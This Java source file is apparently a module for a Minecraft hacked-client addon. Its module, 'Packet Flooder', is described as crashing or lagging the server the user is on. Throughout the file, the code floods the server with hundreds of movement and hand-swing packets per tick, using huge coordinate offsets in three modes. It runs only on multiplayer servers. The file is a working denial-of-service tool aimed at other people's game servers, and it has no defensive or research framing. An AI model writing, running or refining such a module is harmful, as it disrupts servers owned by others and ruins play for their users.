package me.chirin.zeitgeist.modules.crystalass.crash;

import me.chirin.zeitgeist.Zeitgeist;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.utils.Utils;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.HandSwingC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.util.Hand;

import java.util.Objects;

public class PacketFlooder extends Module {
    private final Setting<Modes> crashMode;

    private final Setting<Integer> amount;

    private final Setting<Boolean> onGround;

    private final Setting<Boolean> autoDisable;
    private final Setting<Boolean> onTick;

    public PacketFlooder() {
        super(Zeitgeist.CATEGORYC, "Packet Flooder", "CRYSTAL || Attempts to crash / lag the server you are on by flooding it with packets.");
        SettingGroup sgGeneral = settings.getDefaultGroup();
        onGround = sgGeneral.add(new BoolSetting.Builder()
            .name("onGround")
            .description("Choose to for the packets to send onGround or not.")
            .defaultValue(true)
            .build());
        autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("Auto Disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build());
        onTick = sgGeneral.add(new BoolSetting.Builder()
            .name("on-tick")
            .description("Sends the packets every tick.")
            .defaultValue(false)
            .build());
        amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server per tick.")
            .defaultValue(100)
            .min(1)
            .sliderMax(1000)
            .build());
        crashMode = sgGeneral.add(new EnumSetting.Builder<Modes>()
            .name("mode")
            .description("Which crash mode to use.")
            .defaultValue(Modes.NEW)
            .build());
    }

    @Override
    public void onActivate() {
        if (!mc.isInSingleplayer()) {
            if (Utils.canUpdate() && !onTick.get()) {
                switch (crashMode.get()) {
                    case OLD -> {
                        int bound = amount.get();
                        int i = 0;
                        while (true) {
                            if (i < bound) {
                                Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(Math.random() >= 0.5));
                                mc.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                                i++;
                            } else {
                                break;
                            }
                        }
                    }
                    case NEW -> {
                        int bound = amount.get();
                        int i = 0;
                        while (true) {
                            if (i < bound) {
                                assert mc.player != null;
                                Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                                    mc.player.getX() + (85523 * i),
                                    mc.player.getY() + (85523 * i),
                                    mc.player.getZ() + (85523 * i),
                                    Math.random() >= 0.5));
                                mc.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                                i++;
                            } else {
                                break;
                            }
                        }
                    }
                    case EFFICIENT -> {
                        int bound = amount.get();
                        int i = 0;
                        while (true) {
                            if (i < bound) {
                                assert mc.player != null;
                                Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                                    mc.player.getX() + (85523 * i),
                                    mc.player.getY() + (85523 * i),
                                    mc.player.getZ() + (85523 * i),
                                    onGround.get()));
                                mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.Full(
                                    mc.player.getX() + (85523 * i),
                                    mc.player.getY() + (85523 * i),
                                    mc.player.getZ() + (85523 * i),
                                    mc.player.getYaw() + (85523 * i),
                                    mc.player.getPitch() + (85523 * i),
                                    onGround.get()));
                                mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(
                                    mc.player.getYaw() + (85523 * i),
                                    mc.player.getPitch() + (85523 * i),
                                    onGround.get()));
                                mc.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                                i++;
                            } else {
                                break;
                            }
                        }
                    }
                }
                if (autoDisable.get()) toggle();
            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (!mc.isInSingleplayer()) {
            if (onTick.get()) {
                switch (crashMode.get()) {
                    case OLD -> {
                        if (mc.player != null) {
                            if (mc.getNetworkHandler() != null) {
                                int bound = amount.get();
                                int i = 0;
                                while (true) {
                                    if (i < bound) {
                                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.OnGroundOnly(Math.random() >= 0.5));
                                        mc.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                                        i++;
                                    } else {
                                        break;
                                    }
                                }
                            }
                        }

                    }
                    case NEW -> {
                        if (mc.player != null) {
                            if (mc.getNetworkHandler() != null) {
                                int bound = amount.get();
                                int i = 0;
                                while (true) {
                                    if (i < bound) {
                                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                                            mc.player.getX() + (85523 * i),
                                            mc.player.getY() + (85523 * i),
                                            mc.player.getZ() + (85523 * i),
                                            Math.random() >= 0.5));
                                        mc.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                                        i++;
                                    } else {
                                        break;
                                    }
                                }
                            }
                        }

                    }
                    case EFFICIENT -> {
                        if (mc.getNetworkHandler() != null) {
                            if (mc.player != null) {
                                int bound = amount.get();
                                int i = 0;
                                while (true) {
                                    if (i < bound) {
                                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(
                                            mc.player.getX() + (85523 * i),
                                            mc.player.getY() + (85523 * i),
                                            mc.player.getZ() + (85523 * i),
                                            onGround.get()));
                                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.Full(
                                            mc.player.getX() + (85523 * i),
                                            mc.player.getY() + (85523 * i),
                                            mc.player.getZ() + (85523 * i),
                                            mc.player.getYaw() + (85523 * i),
                                            mc.player.getPitch() + (85523 * i),
                                            onGround.get()));
                                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.LookAndOnGround(
                                            mc.player.getYaw() + (85523 * i),
                                            mc.player.getPitch() + (85523 * i),
                                            onGround.get()));
                                        mc.getNetworkHandler().sendPacket(new HandSwingC2SPacket(Hand.MAIN_HAND));
                                        i++;
                                    } else {
                                        break;
                                    }
                                }
                            }
                        }

                    }

                }

            }
        } else {
            error("You must be on a server, toggling.");
            toggle();
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!autoDisable.get()) {
            return;
        }
        toggle();
    }

    public enum Modes {
        NEW,
        OLD,
        EFFICIENT,
    }

    public enum TickEventModes {
        Pre,
        Post
    }

}
